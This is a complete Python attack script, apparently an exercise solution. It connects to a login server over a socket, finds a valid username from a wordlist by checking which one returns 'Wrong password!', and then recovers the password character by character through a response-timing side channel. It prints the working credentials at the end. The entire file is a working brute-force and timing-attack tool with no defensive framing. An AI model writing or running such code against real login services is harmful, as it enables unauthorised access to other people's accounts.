import socket
import argparse
import time
import json
import string

parser = argparse.ArgumentParser()
parser.add_argument('hostname')
parser.add_argument('port')
args = parser.parse_args()

with socket.socket() as client_socket, open('logins.txt') as file:
    client_socket.connect((args.hostname, int(args.port)))
    string_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    login = ''
    password = ''
    flag = False

    for i in map(str.strip, file.readlines()):
        json_file = {"login": i, "password": ""}
        data = json.dumps(json_file).encode()
        client_socket.send(data)
        response = client_socket.recv(1024)
        if json.loads(response.decode())['result'] == "Wrong password!":
            login += i
            break

    while True:
        for i in string_chars:
            json_file = json.dumps({"login": login, "password": password + i})
            data = json_file.encode()
            start = time.perf_counter()
            client_socket.send(data)
            response = client_socket.recv(1024)
            finish = time.perf_counter() - start
            if json.loads(response.decode())['result'] == "Wrong password!" and finish >= 0.1:
                password += i
            elif json.loads(response.decode())['result'] == "Connection success!":
                flag = True
                print(json_file)
                break
        if flag:
            break
